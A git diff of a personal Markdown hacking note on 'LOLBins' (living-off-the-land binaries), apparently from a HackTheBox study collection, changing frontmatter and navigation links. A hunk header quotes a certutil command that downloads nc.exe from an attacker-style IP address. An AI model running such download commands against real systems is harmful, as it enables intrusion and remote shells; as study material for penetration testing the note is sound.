@@ -1,10 +1,10 @@
 ---
-title:  "LOLBins"
+title: "LOLBins"
 tags:
   - cs/hacking
   - cs/hacking/htb
-programming-languages:
 created: 2022-07-11
+type: note
 ---
 Aka Living off the land binaries, which are binaries that an attacker can use to perform actions beyond their original purpose.
 
@@ -69,6 +69,5 @@ cerutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
 ```
 
 
-## Related
-- [Privilege Escalation Notes](notes/hacking/priv-escalation-notes.md)
-- [Pentesting Notes & Commands](notes/hacking/pentesting-notes-commands.md)
+> [!nav]
+> [[hacking-hub|Hacking]]
